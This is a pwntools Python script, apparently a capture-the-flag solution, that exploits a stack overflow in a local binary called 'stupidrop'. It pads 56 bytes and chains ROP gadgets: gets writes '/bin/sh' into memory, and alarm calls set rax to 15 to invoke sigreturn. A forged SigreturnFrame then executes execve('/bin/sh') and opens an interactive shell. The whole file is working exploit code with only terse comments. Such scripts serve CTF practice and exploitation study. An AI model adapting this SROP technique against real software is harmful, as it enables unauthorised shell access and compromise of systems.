from pwn import *

gdbcmds = '''
b *(main+60)
b *(main+65)
b *0x4004b0
c
'''
context.arch = 'amd64'
elf = ELF('./stupidrop')
target = process('./stupidrop')
#target = gdb.debug('./stupidrop', gdbscript=gdbcmds)

popRdi = 0x00000000004006a3
ret = 0x0000000000400289
getsCall = 0x00400632
syscall = 0x40063e
binshAddr = 0x601070

frame = SigreturnFrame()
frame.rip = syscall
frame.rax = 0x3b  # execv syscall
frame.rdi = binshAddr # /bin/sh addr
frame.rsi = 0x0
frame.rdx = 0x0


''' writes /bin/sh to 0x601070 '''
payload = b""
payload += b"A"*56
payload += p64(popRdi)
payload += p64(binshAddr)
payload += p64(elf.plt['gets'])


''' makes rax 0xf
    calls alarm with 0xf
    calls alarm with 0x0 so that alarm returns the prev seconds
'''
payload += p64(ret)
payload += p64(popRdi)
payload += p64(0xf)
payload += p64(elf.plt['alarm']) 
payload += p64(popRdi)
payload += p64(0x0)
payload += p64(elf.plt['alarm'])

''' calls sigreturn
'''
payload += p64(syscall)
payload += bytes(frame)


target.sendline(payload)
target.sendline(b"/bin/sh\x00")
target.interactive()


